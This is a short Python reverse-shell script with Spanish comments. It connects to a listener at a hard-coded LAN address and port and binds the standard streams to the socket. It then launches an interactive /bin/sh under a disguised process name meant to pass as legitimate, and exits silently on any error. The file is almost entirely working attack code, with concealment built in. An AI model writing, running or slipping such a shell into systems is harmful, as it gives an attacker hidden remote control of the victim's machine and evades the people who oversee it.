import socket
import os
import sys

# ip local para pruebas
IP = "192.168.1.135"
PORT = 4242

try:
    # Crear el socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Conectar al listener
    s.connect((IP, PORT))
    # redirigir las entradas y salidas al socket
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    # ejecutar la shell interactiva
    # subprocess.call(["/bin/sh", "-i"])
    args = ["[procesoSuperLegitimo/u:1]", "-i"]
    os.execv("/bin/sh", args) # lo alojamos en el mismo proceso

except Exception:
    # si cualquier tipo de excepción la ejecución muere sin mostrar errores
    sys.exit(0)

